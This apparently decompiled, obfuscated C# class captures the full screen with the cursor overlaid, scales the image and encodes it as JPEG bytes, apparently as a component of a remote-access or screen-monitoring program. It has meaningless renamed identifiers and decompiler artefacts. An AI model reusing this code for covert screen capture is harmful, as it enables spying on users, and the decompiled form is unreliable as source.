using GDBD.Mocks;
using GDBD.Workers;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace GDBD.Bridges
{
	internal sealed class ValClientBridge
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		public static Bitmap IncludeList(Screen value)
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			try
			{
				int info = 0;
				int pred = 0;
				Bitmap bitmap = Publisher.DisableFilter(ref info, ref pred);
				Bitmap bitmap2 = new Bitmap(value.Bounds.Width, value.Bounds.Height);
				using (Graphics graphics = Graphics.FromImage(bitmap2))
				{
					graphics.CompositingQuality = CompositingQuality.HighSpeed;
					graphics.SmoothingMode = SmoothingMode.HighSpeed;
					graphics.InterpolationMode = InterpolationMode.HighQualityBicubic;
					graphics.CopyFromScreen(value.Bounds.X, value.Bounds.Y, 0, 0, value.Bounds.Size);
					graphics.DrawImage(bitmap, new Rectangle(info, pred, bitmap.Width, bitmap.Height));
				}
				return bitmap2;
			}
			catch
			{
				Bitmap bitmap3 = new Bitmap(value.Bounds.Width, value.Bounds.Height);
				using (Graphics graphics2 = Graphics.FromImage(bitmap3))
				{
					graphics2.CompositingQuality = CompositingQuality.HighSpeed;
					graphics2.SmoothingMode = SmoothingMode.HighSpeed;
					graphics2.InterpolationMode = InterpolationMode.HighQualityBicubic;
					graphics2.CopyFromScreen(value.Bounds.X, value.Bounds.Y, 0, 0, value.Bounds.Size);
				}
				return bitmap3;
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static Image PushList(Image info, int version_result, int consumer_min)
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			double num = (double)consumer_min / (double)info.Height;
			double num2 = (double)version_result / (double)info.Width;
			int height;
			int width;
			if (num2 >= num)
			{
				height = (int)((double)info.Height * num);
				width = (int)((double)info.Width * num);
			}
			else
			{
				height = (int)((double)info.Height * num2);
				width = (int)((double)info.Width * num2);
			}
			Image image = new Bitmap(width, height);
			using (Graphics graphics = Graphics.FromImage(image))
			{
				graphics.CompositingQuality = CompositingQuality.HighSpeed;
				graphics.SmoothingMode = SmoothingMode.HighSpeed;
				graphics.InterpolationMode = InterpolationMode.HighQualityBicubic;
				graphics.DrawImage(info, 0, 0, width, height);
				graphics.Dispose();
			}
			return image;
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static byte[] PrepareList(Image def)
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			using (MemoryStream memoryStream = new MemoryStream())
			{
				def.Save(memoryStream, ImageFormat.Jpeg);
				return memoryStream.ToArray();
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public ValClientBridge()
		{
			//Discarded unreachable code: IL_0002, IL_0006, IL_0012, IL_0019
			//IL_0003: Incompatible stack heights: 0 vs 1
			//IL_0007: Incompatible stack heights: 0 vs 1
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_001a: Incompatible stack heights: 0 vs 1
			SingletonReader.PushGlobal();
			base._002Ector();
		}
	}
}
